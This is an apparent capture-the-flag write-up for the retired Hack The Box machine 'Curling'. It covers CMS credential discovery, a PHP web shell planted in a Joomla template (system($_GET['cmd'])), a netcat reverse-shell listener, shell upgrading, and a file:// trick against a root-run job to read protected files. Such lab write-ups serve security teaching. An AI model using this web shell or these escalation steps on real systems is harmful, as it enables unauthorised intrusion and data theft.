---
title: "HTB Curling – Web Exploitation & Privilege Escalation Case Study"
categories:
  - Reporting
  - HTB Write Ups
tags: [HTB, Linux, Web, Enumeration, Privilege Escalation, Nmap, CeWL, Joomla, Netcat, Python]
---

## Executive Summary

This case study documents the assessment of the retired Hack The Box machine **Curling**, a Linux-based target designed to demonstrate common weaknesses in web application security, credential handling, and privileged automation. The engagement emphasizes structured enumeration, careful analysis of application behavior, and the chaining of misconfigurations to achieve full system compromise.

The assessment was completed using standard open-source tooling commonly employed in web and infrastructure testing, including `nmap` for service discovery, `cewl` and `joomscan` for web application enumeration, `netcat` for shell handling, and small Python utilities for shell stabilization and file transfer.


All activities were conducted educational and professional demonstration purposes.

## Tools & Techniques Used

- `nmap` – service discovery and version detection
- `cewl` – wordlist generation from web content
- `joomscan` – Joomla CMS enumeration
- `netcat` – reverse shell handling
- `Python` – shell stabilization and ad-hoc file transfer

---

## Reconnaissance & Enumeration

Initial reconnaissance began with a standard TCP scan to identify exposed services and potential attack vectors.

```bash
nmap -sC -sV <target-ip>
```

The scan identified an HTTP service hosting a Joomla-based web application. Given the presence of a content management system, further enumeration focused on application-specific discovery and potential credential exposure.

To assist with user and password discovery, a custom wordlist was generated directly from the website content.

```bash
cewl http://<target-ip>
```

This process identified several potential usernames, including variations of Floris, which later proved relevant during authentication attempts.

Web Application Analysis

During manual review of the application content, a Base64-encoded string was identified.

Q3VybGluZzIwMTgh


Decoding the value revealed the following string.

Curling2018!


This discovery suggested the presence of hardcoded or reused credentials within the application. Joomla-specific enumeration was then performed to further assess exposed components and configuration.

```bash
joomscan -u http://<target-ip>
```

Using the identified username and decoded password, successful authentication to the Joomla administrative interface was achieved.

Initial Access

With administrative access to the CMS, server-side code execution became possible through template modification. A Joomla template file (error.php) was edited to introduce a minimal command execution primitive.

```bash
system($_GET['cmd']);
```

This allowed command execution via URL parameters and confirmed remote code execution on the target host.

Reverse Shell & Foothold

To establish an interactive foothold, a reverse shell payload was deployed. A listener was started on the attacker system.

```bash
nc -nlvp 9001
```

Once triggered, a reverse shell was obtained as the web server user. The shell was upgraded to a fully interactive TTY to improve usability.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Local enumeration confirmed access to user-level files, and the user flag was retrieved.

Local Enumeration & Credential Discovery

Further inspection of the filesystem revealed a file named password_backup. The contents appeared to be encoded or obfuscated rather than plaintext.

To analyze the file safely, it was transferred to the local system using a temporary HTTP server.

```bash
python3 -m http.server
```
```bash
wget http://<target-ip>:8000/password_backup
```

Offline analysis revealed the decoded credential.
```
5d<wdCbdZu)|hChXll
```

This password was used in subsequent access attempts.

Privilege Escalation

During continued enumeration, an automated process was identified within the admin-area directory. The process periodically generated reports by retrieving data from a URL specified in a configuration file. File ownership and permissions indicated that this process executed with elevated privileges.

By modifying the configuration to reference a local file using the file:// URI scheme, the process could be coerced into reading restricted system files.

```bash
url = "file:///etc/passwd"
```

When the process executed, the contents of the restricted file were written to the output report, confirming arbitrary file read capabilities as root. This primitive was sufficient to retrieve the root flag and complete the engagement.

Impact & Risk Discussion

The following security issues were identified during the assessment:

Insecure credential storage and reuse

Administrative CMS access without sufficient hardening

Server-side code execution through template modification

Automated processes running with elevated privileges

Insufficient input validation in privileged workflows

In a real-world environment, these weaknesses could lead to full system compromise, credential disclosure, and broader organizational impact.

Conclusion

This assessment demonstrates how multiple low- to moderate-severity issues can be chained together to achieve complete system compromise. The Curling machine reinforces the importance of defense-in-depth, secure credential management, and careful review of automated processes executing with elevated privileges.

Disclaimer

This write-up is based on a retired Hack The Box machine and is intended solely for educational purposes and professional skill demonstration.
